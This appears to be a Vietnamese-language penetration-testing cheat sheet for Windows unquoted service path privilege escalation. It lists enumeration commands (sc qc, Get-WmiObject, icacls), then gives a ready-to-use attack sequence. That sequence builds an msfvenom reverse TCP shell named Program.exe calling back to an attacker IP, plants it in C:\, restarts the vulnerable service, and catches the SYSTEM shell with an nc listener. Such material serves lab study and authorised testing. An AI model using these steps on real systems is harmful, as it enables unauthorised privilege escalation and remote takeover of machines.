# Unquoted Service Paths

## Điểm chính khai thác

* Khai thác các dịch vụ Windows có đường dẫn file thực thi không được bao quanh bởi dấu ngoặc kép và chứa khoảng trắng để nâng quyền, tận dụng việc Windows phân tích sai các đoạn đường dẫn.
* Yêu cầu quyền ghi vào C:\ hoặc thư mục con (như C:\Program) để đặt file thực thi độc hại vào đoạn đường dẫn được ưu tiên.
* Dịch vụ chạy với quyền LocalSystem cung cấp đặc quyền SYSTEM nếu file thực thi độc hại được thực thi.
* Hiệu quả khi dịch vụ tự động khởi động hoặc có thể khởi động lại, nhưng cần kiểm tra quyền và CanRestart để đảm bảo kích hoạt.

## Các bước khai thác

### Kiểm tra lỗ hổng

#### Xác định mục tiêu tiềm năng

Xác định đường dẫn nhị phân của dịch vụ để kiểm tra xem có thiếu dấu ngoặc kép và chứa khoảng trắng:

```
sc qc <ServiceName>
```

Output mong đợi: Thông tin dịch vụ, ví dụ: `BINARY_PATH_NAME: C:\Program Files\Vuln App\vuln.exe, START_NAME: LocalSystem`

Liệt kê các dịch vụ để tìm đường dẫn không ngoặc kép chứa khoảng trắng:

```
Get-WmiObject Win32_Service | Select Name, PathName
```

Output mong đợi: Danh sách dịch vụ, ví dụ: `Name: vulnerableService, PathName: C:\Program Files\Vuln App\vuln.exe`

#### Kiểm tra quyền truy cập hoặc cấu hình

Kiểm tra quyền trên thư mục C:\ hoặc thư mục con để xác định khả năng ghi:

```
icacls C:\
```

Output mong đợi: Quyền thư mục, ví dụ: `BUILTIN\Users:(M)`

Kiểm tra quyền trên thư mục con cụ thể nếu cần:

```
icacls C:\Program
```

Output mong đợi: Quyền thư mục, ví dụ: `BUILTIN\Users:(F)`

#### Phân tích ngữ cảnh thực thi

Xác định hành vi thực thi dịch vụ để đảm bảo nhị phân độc hại sẽ được ưu tiên:

```
sc qc <ServiceName>
```

Output mong đợi: Xác nhận `START_TYPE: AUTO` hoặc `CanRestart: True`, ví dụ: `START_TYPE: AUTO`

### Thực thi khai thác

#### Chuẩn bị payload hoặc mã khai thác

Tạo reverse shell để đặt vào đoạn đường dẫn được ưu tiên:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=5555 -f exe -o Program.exe
```

Ghi chú: Đảm bảo kiến trúc payload khớp hệ thống (x64 cho 64-bit). Thay `<KALI_IP>` bằng IP attacker. Đặt tên `Program.exe` để khớp `C:\Program.exe`.

Sao lưu nhị phân gốc (nếu tồn tại) để tránh làm hỏng hệ thống:

```
copy C:\Program.exe C:\Program.exe.bak
```

Ghi chú: Chỉ thực hiện nếu `C:\Program.exe` đã tồn tại. Lưu bản sao ở vị trí an toàn.

#### Áp dụng khai thác

Triển khai nhị phân độc hại vào thư mục được ưu tiên:

```
copy Program.exe C:\
```

Ghi chú: Yêu cầu quyền Modify (M) hoặc Full (F) trên `C:\`. Kiểm tra bằng `icacls C:\` trước.

#### Kích hoạt khai thác

Khởi động lại dịch vụ để thực thi nhị phân độc hại:

```
sc stop <ServiceName>
sc start <ServiceName>
```

Ghi chú: Kiểm tra `CanRestart` bằng `sc qc <ServiceName>`. Nếu `CanRestart` là False, đợi reboot hoặc kiểm tra kích hoạt khác (như phụ thuộc dịch vụ).

Chờ kết nối reverse shell sau khi dịch vụ khởi động:

```
nc -lvnp 5555
```
